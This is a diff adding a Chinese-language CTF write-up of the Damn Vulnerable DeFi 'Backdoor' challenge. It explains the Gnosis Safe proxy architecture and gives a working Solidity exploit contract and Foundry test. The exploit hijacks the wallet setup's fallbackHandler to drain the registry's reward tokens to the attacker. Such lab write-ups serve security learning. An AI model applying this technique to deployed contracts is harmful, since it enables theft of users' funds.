@@ -681,3 +681,166 @@ contract FreeRider is Test {
 forge test --match-contract FreeRider -vvvv
 ```
 
+
+
+# #11 - Backdoor
+
+合约:
+
+- [GnosisSafeProxyFactory.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/lib/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol) GnosisSafe 工厂合约
+- [GnosisSafeProxy.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/lib/safe-contracts/contracts/proxies/GnosisSafeProxy.sol) GnosisSafe 代理合约
+- [GnosisSafe.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/lib/safe-contracts/contracts/GnosisSafe.sol) GnosisSafe 实现合约
+- [WalletRegistry.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/src/backdoor/WalletRegistry.sol) 钱包注册表合约
+
+题目要求:
+
+为了激励在他们的团队中创建更安全的钱包，有人部署了 Gnosis Safe 钱包注册表合约。当团队中有人部署钱包时,将获得 10 个 DVT 代币的奖励.
+
+为确保一切安全无虞，注册表与 Gnosis Safe Proxy Factory 工厂合约紧密集成，并进行了一些额外的安全检查.
+
+目前有四个人部署钱包可获得代币奖励,分别为：Alice、Bob、Charlie 和 David,注册表合约里有 40 个 DVT 代币提供奖励
+
+目标是从注册表合约中获取所有 DVT 代币,在单笔交易中.
+
+解决方案:
+
+这道题花费了我很多时间去阅读学习 Gnosis Safe 的合约代码,以了解合约的架构,简单把完成这道题需要知道的点写下来
+
+TL;DR
+
+比较重要的 三个合约
+
+`GnosisSafe.sol` singleton,也可以说成是逻辑合约 或 实现合约 
+
+`GnosisSafeProxy.sol `代理合约
+
+`GnosisSafeProxyFactory.sol` 用于创建代理合约 
+
+![GnosisSafeProxy.png](./testimage/Blackdoor_GnosisSafeProxy.png)
+
+`GnosisSafeProxyFactory` 为工厂合约,遵循最小代理合约模式为每一个多签钱包创建一个  `GnosisSafeProxy` 代理合约,通过`delegatecall` 委托调用 `GnosisSafe` 逻辑合约,执行的上下文和存储改变是在代理合约.
+
+![GnosisSafeProxy.png](./testimage/Blackdoor_Call.png)
+
+**GnosisSafeProxy.sol** 只有构造函数 和 **fallback** 函数.
+
+构造函数用于设置逻辑合约地址,也就是 **GnosisSafe** 合约地址
+
+```solidity
+    constructor(address _singleton) {
+        require(_singleton != address(0), "Invalid singleton address provided");
+        singleton = _singleton;
+    }
+```
+
+**fallback()** 回退函数里内联汇编委托调用逻辑合约,执行 GnosisSafe 的逻辑,改变 GnosisSafeProxy 的存储状态. 如果 calldata = 0xa619486e ( masterCopy()的函数选择器 ), 则返回逻辑合约的地址
+
+```solidity
+    fallback() external payable {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
+            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
+            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
+                mstore(0, _singleton)
+                return(0, 0x20)
+            }
+            calldatacopy(0, 0, calldatasize())
+            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            if eq(success, 0) {
+                revert(0, returndatasize())
+            }
+            return(0, returndatasize())
+        }
+    }
+```
+
+`GnosisSafeProxy.sol` 多签钱包的逻辑的实现合约. **setup(address[],uint256,address,bytes,address,address,uint256,address)** : **0xb63e800d** 函数用于初始化合约
+
+```solidity
+    function setup(
+        address[] calldata _owners, //多签钱包所有者列表
+        uint256 _threshold, //多签钱包执行交易所需要的确认数量
+        address to, //可选的委托调用地址
+        bytes calldata data, //委托调用data
+        address fallbackHandler, //设置多签钱包的fallbackHandler地址
+        address paymentToken, //付款token 地址
+        uint256 payment, //付款金额
+        address payable  paymentReceiver //付款接收者
+    )
+```
+
+以上就是完成题目需要的一些前置知识,然后看 `WalletRegistry` 这个我们需要从中获得里面 40个 DVT 的注册奖励表合约,只有 4 个外部地址创建 GnosisSafe 钱包才能获得 10 个 DVT 钱包,那我们做为攻击者应该怎么获得.
+
+看 到 **proxyCreated()** 函数,函数检查了是否被是被工厂合约调用,以及是否安照预期的正常初始化(检查有没有使用正确的逻辑合约,检查多签钱包所有者得为1人,多签钱包执行交易所需要的确认数量得为1,是否是可获得奖励代币的那四个地址创建钱包),如果通过则发送 DVT 代币奖励给创钱包的地址.
+
+读过代码发现这个函数会在工厂合约调用  **createProxyWithCallback()** ,新的 `GnosisSafeProxy` 合同被成功部署和初始化后(也就是创建钱包)被工厂合约调用.
+
+至于如何攻击获得 `WalletRegistry` 合约里的 40 个原本该奖励给 Alice、Bob、Charlie 和 David 的 DVT 代币,这里有两个方法
+
+1.`GnosisSafeProxyFactory` ->  **createProxyWithCallback()** 创建钱包代理合约时 **initializercalldata** 初始化`to` `data` 委托调用我们恶意部署的合约,call dvt token 合约 approve() 将代币授权,因为这里还没初始化完成不会回调 **proxyCreated()** 将代币 transfer 给钱包代理合约,所以先授权,等 **proxyCreated()** 函数完成后再将代币 transfer.
+
+2.感觉这种方法更符合 **Backdoor** 这个题意,利用的是 FallbackManager.sol  当调用逻辑合约里不存的函数时,会在 **fallbak()** 回退函数里  fallbackHandler.call 调用这个不存的函数.也就是 **initializercalldata** 初始化里将 **fallbackHandler** 设置为 DVT 代币合约地址,这样我们等同于创建了一个后门,调用代理合约 **transfer()** 这个函数不存在,会在 **fallbak()** 里 dvt.call 调用 transfer 将代币发送给我们.
+
+使用 foundry 编写测试:
+
+[Backdoor.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Backdoor.t.sol) 
+
+使用第 2 个方法完成挑战
+
+```solidity
+contract PayLoad {
+    GnosisSafe mastercopy;
+    DamnValuableToken dvt;
+    GnosisSafeProxy walletProxyaddr;
+    WalletRegistry walletregistry;
+    GnosisSafeProxyFactory factory;
+    
+    constructor(
+                GnosisSafe _mastercopy,
+                DamnValuableToken _dvtaddr, 
+                WalletRegistry _walletregistryaddr, 
+                GnosisSafeProxyFactory _factoryaddr          
+            ) {
+        mastercopy = _mastercopy;
+        dvt = _dvtaddr;
+        walletregistry = _walletregistryaddr;
+        factory = _factoryaddr;
+    }
+    function Start(address[] memory _beneficiaries) public {
+    for (uint8 i=0; i < _beneficiaries.length; i++) {
+        address beneficiary = _beneficiaries[i];
+        address[] memory owners = new address[](1);
+        owners[0] = beneficiary;
+        bytes memory _initializercalldata  = abi.encodeWithSelector(mastercopy.setup.selector, 
+                                                                    owners,
+                                                                    1,
+                                                                    address(0),
+                                                                    0x0,
+                                                                    address(dvt),
+                                                                    address(0),
+                                                                    0,
+                                                                    address(0)
+                                                                );
+        walletProxyaddr = factory.createProxyWithCallback(address(mastercopy), _initializercalldata, 0, walletregistry);
+        IERC20(address(walletProxyaddr)).transfer(msg.sender, 10e18);
+        }
+    }
+}
+
+contract Backdoor is Test {
+    function testExploit() public {
+        vm.startPrank(attacker);
+        payload = new PayLoad(masterCopy, dvt, walletRegistry, walletFactory);
+        payload.Start(users);
+        vm.stopPrank();
+        verfiy();
+    }	
+}
+```
+
+```
+forge test --match-contract Backdoor -vvvv
+```
+
